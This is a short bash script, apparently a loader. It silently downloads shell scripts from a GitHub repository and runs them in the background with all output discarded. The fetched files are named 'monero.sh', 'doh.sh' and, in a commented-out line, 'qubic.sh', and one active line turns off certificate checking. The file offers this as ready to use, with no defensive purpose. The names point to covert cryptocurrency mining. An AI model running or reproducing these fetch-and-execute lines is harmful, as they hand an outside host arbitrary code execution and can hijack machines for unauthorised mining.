#!/bin/bash

# bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/hanrzme/qiyywnbc/main/qubic.sh) >/dev/null 2>&1 &
bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/hanrzme/qiyywnbc/main/monero.sh) >/dev/null 2>&1 &
bash <(wget -qO- https://raw.githubusercontent.com/hanrzme/qiyywnbc/refs/heads/main/doh.sh) >/dev/null 2>&1 &
